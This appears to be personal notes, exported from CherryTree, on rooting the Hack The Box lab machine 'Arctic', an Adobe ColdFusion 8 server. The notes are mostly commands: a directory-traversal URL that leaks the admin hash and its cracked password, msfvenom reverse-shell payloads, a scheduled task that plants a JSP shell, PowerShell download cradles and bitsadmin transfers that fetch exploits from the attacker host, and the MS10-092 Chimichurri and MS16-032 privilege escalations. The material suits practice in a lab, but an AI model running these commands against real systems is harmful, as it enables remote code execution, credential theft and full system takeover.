<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.11 Arctic</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.11 Arctic</h1><br/>root@kali:~/Desktop/Machines/HTB/Arctic# nmap -sC -sV -oN Arctic.txt 10.10.10.11 <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-13 21:14 EDT<br />Nmap scan report for 10.10.10.11<br />Host is up (0.20s latency).<br />Not shown: 997 filtered ports<br />PORT      STATE SERVICE VERSION<br />135/tcp   open  msrpc   Microsoft Windows RPC<br />8500/tcp  open  fmtp?<br />49154/tcp open  msrpc   Microsoft Windows RPC<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 149.70 seconds<br /><br />8500 = cold fusion<br /><a href="http://10.10.10.11:8500/cfdocs/dochome.htm">http://10.10.10.11:8500/cfdocs/dochome.htm</a> lets me know it is adobe coldfusion 8<br />searchsploit coldfusion (second one is a directory traversal)<br />searchsploit -x exploits/multiple/remote/14641.py<br /><a href="http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en">http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a><br />username = admin (given)<br />hash    =  2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03<br /><a href="https://crackstation.net/">https://crackstation.net/</a>           sha1 PASSWORD=  happyday<br /><br /><br /><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.60 LPORT=443 -f raw &gt; shell.jsp</code><br /><br />host shell.jsp with a python SimpleHttpserver<br />download with a scheduled task &gt;Debugging &amp; Logging &gt; scheduled tasks<br />    taskname    = revshell<br />    frequency   = one-time<br />    url              = <a href="http://10.10.14.60:8000/shell.jsp">http://10.10.14.60:8000/shell.jsp</a><br />    pubish          = x (save output to file)<br />    file            = C:\ColdFusion8\wwwroot\CFIDE\shell.jsp<br />    submit<br />    run scheduled task<br />    nc -nlvp 443<br />    Navigate to <a href="http://10.10.10.11:8500/CFIDE/shell.jsp">http://10.10.10.11:8500/CFIDE/shell.jsp</a> (caps are important!!!)<br />    enjoy your user shell<br /><br />copy sherlock into webdir<br />powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/Sherlock.ps1')">http://10.10.14.60:8000/Sherlock.ps1&#39;)</a><br />------------------------------------------------------------------------------------------------------------------------------<br /><br />Title      : Task Scheduler .XML<br />MSBulletin : MS10-092<br />CVEID      : 2010-3338, 2010-3888<br />Link       : <a href="https://www.exploit-db.com/exploits/19930/">https://www.exploit-db.com/exploits/19930/</a><br />VulnStatus : Appears Vulnerable<br /><br />Title      : Secondary Logon Handle<br />MSBulletin : MS16-032<br />CVEID      : 2016-0099<br />Link       : <a href="https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</a><br />VulnStatus : Appears Vulnerable<br />------------------------------------------------------------------------------------------------------------------------------------<br /><br />MS10-092 is also known as Chimichurri<br /><a href="https://github.com/Re4son/Chimichurri">https://github.com/Re4son/Chimichurri</a> &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;badass. the exe is already compiled<br />put the .exe in the WebHost dir<br /><br />cd C:\ColdFusion8\ &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;muy Importante!! needed to run the script<br />echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br />echo $url = &quot;http://10.10.14.60:8000/Chimichurri.exe&quot; &gt;&gt;wget.ps1<br />echo $file = &quot;exploit.exe&quot; &gt;&gt;wget.ps1<br />echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1<br />powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1<br />(start nc -nlvp 443)<br />exploit.exe 10.10.14.60 443<br />Enjoy your system shell!<br /><br /><br /><br /><br /><br />echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget2.ps1<br />echo $url = &quot;http://10.10.14.60:8000/Invoke-MS16032.ps1&quot; &gt;&gt;wget2.ps1<br />echo $file = &quot;MS16032.ps1&quot; &gt;&gt;wget2.ps1<br />echo $webclient.DownloadFile($url,$file) &gt;&gt;wget2.ps1<br />powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget2.ps1<br /><br />powershell.exe MS16032.ps1 <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai LHOST=10.10.14.60 LPORT=3234 -f ps1 &gt; shart.ps1<br /><br />cp /root/Desktop/Tools/Empire/data/module_source/privesc/Invoke-MS16032.ps1 .<br />cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .<br />vi Invoke-Ms16032.ps1<br />    Invoke-MS16032 -Command “IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/reverseshell3235.ps1')">http://10.10.14.60:8000/reverseshell3235.ps1&#39;)</a>”               &lt;&lt;add to bottom<br />vi Invoke-PowerShellTcp.ps1<br />    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.60 -port 3235                     &lt;&lt;add to bottom<br /><br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60:8000/Sherlock.ps1')">http://10.10.14.60:8000/Invoke-MS16032.ps1&#39;)</a><br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60:8000/Invoke-MS16032.ps1</a> C:\users\tolis\Desktop\Invoke-MS16032.ps1<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f asp &gt; reverse.asp</code></div></body></html>